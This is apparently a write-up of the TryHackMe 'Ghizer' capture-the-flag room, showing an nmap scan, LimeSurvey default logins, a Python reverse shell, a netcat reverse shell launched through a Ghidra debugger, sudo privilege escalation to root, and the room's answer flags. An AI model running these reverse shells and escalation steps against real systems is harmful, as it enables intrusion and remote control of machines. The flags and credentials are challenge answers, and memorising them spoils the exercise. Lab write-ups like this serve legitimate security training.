# Ghizer

lucrecia has installed multiple web applications on the server.

[Ghizer](https://tryhackme.com/room/ghizerctf)

## Topic's

- Network Enumeration
- Security Misconfiguration
- CVE-2018-17057 - LimeSurvey < 3.16
- Stored Passwords & Keys
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Flag

Are you able to complete the challenge?
The machine may take up to 5 minutes to boot and configure

```
kali@kali:~/CTFs/tryhackme/Ghizer$ sudo nmap -A -sS -sC -sV -O 10.10.106.146
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 17:18 CEST
Nmap scan report for 10.10.106.146
Host is up (0.032s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe:
|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
|     Please login with USER and PASS.
|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: LimeSurvey http://www.limesurvey.org
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         LimeSurvey
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 5.4.2
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Ghizer &#8211; Just another WordPress site
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-23T17:27:31
|_Not valid after:  2030-07-21T17:27:31
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.80%I=7%D=10/11%Time=5F83224D%P=x86_64-pc-linux-gnu%r(NUL
SF:L,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x2
SF:03\.0\.3\)\n")%r(GenericLines,58,"220\x20Welcome\x20to\x20Anonymous\x20
SF:FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\
SF:x20USER\x20and\x20PASS\.\n")%r(Help,58,"220\x20Welcome\x20to\x20Anonymo
SF:us\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x2
SF:0with\x20USER\x20and\x20PASS\.\n")%r(GetRequest,58,"220\x20Welcome\x20t
SF:o\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please
SF:\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(HTTPOptions,58,"220\x2
SF:0Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n
SF:530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(RTSPReque
SF:st,58,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x
SF:203\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n"
SF:)%r(RPCCheck,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20
SF:\(vsFTPd\x203\.0\.3\)\n")%r(DNSVersionBindReqTCP,58,"220\x20Welcome\x20
SF:to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Pleas
SF:e\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(DNSStatusRequestTCP,5
SF:8,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\
SF:.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(
SF:SSLSessionReq,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x2
SF:0\(vsFTPd\x203\.0\.3\)\n")%r(TerminalServerCookie,33,"220\x20Welcome\x2
SF:0to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")%r(TLSSes
SF:sionReq,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsF
SF:TPd\x203\.0\.3\)\n")%r(Kerberos,33,"220\x20Welcome\x20to\x20Anonymous\x
SF:20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")%r(SMBProgNeg,33,"220\x20We
SF:lcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")%
SF:r(X11Probe,58,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(
SF:vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20P
SF:ASS\.\n")%r(FourOhFourRequest,58,"220\x20Welcome\x20to\x20Anonymous\x20
SF:FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\
SF:x20USER\x20and\x20PASS\.\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/11%OT=21%CT=1%CU=43159%PV=Y%DS=2%DC=T%G=Y%TM=5F8322
OS:F6%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=7%ISR=106%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   30.98 ms 10.8.0.1
2   31.23 ms 10.10.106.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.89 seconds
```

[http://10.10.106.146/index.php/admin/authentication/sa/login](http://10.10.106.146/index.php/admin/authentication/sa/login)

[https://survey-consulting.com/how-to-restore-a-limesurvey-password/](https://survey-consulting.com/how-to-restore-a-limesurvey-password/)

`admin:password`

[http://10.10.106.146/installer/](http://10.10.106.146/installer/)

[LimeSurvey < 3.16 - Remote Code Execution ](https://www.exploit-db.com/exploits/46634)

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

```php
'username' => 'Anny',
                        'password' => 'P4$W0RD!!#S3CUr3!',
```

```
https://10.10.106.146/?devtools
```

`stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()`

`print new java.lang.Runtime().exec("nc 10.8.106.222 1337 -e /bin/sh")`

```
kali@kali:~/CTFs/tryhackme/Ghizer$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.106.146] 40546
python -c "import pty; pty.spawn('/bin/bash')"
veronica@ubuntu:~$ cd ~
cd ~
veronica@ubuntu:~$ ls
ls
base.py  Documents  examples.desktop  Music     Public       Templates  Videos
Desktop  Downloads  ghidra_9.0        Pictures  __pycache__  user.txt
veronica@ubuntu:~$ cat user.txt
cat user.txt
THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}
veronica@ubuntu:~$
```

`echo 'import pty; pty.spawn("/bin/bash")' >> /home/veronica/base.py`

```
veronica@ubuntu:~$ rm -rf base.py
rm -rf base.py
veronica@ubuntu:~$ echo 'import pty; pty.spawn("/bin/bash")' >> /home/veronica/base.py
<port pty; pty.spawn("/bin/bash")' >> /home/veronica/base.py
veronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py
sudo /usr/bin/python3.5 /home/veronica/base.py
root@ubuntu:~# whoami
whoami
root
root@ubuntu:~# cd /root
cd /root
root@ubuntu:/root# ls
ls
Lucrecia  root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}
root@ubuntu:/root#
```

1. What are the credentials you found in the configuration file? example: user:password

`Anny:P4$W0RD!!#S3CUr3!`

2. What is the login path for the wordpress installation?

`/?devtools`

3. Compromise the machine and locate user.txt

`THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}`

4. Escalate privileges and obtain root.txt

`THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}`
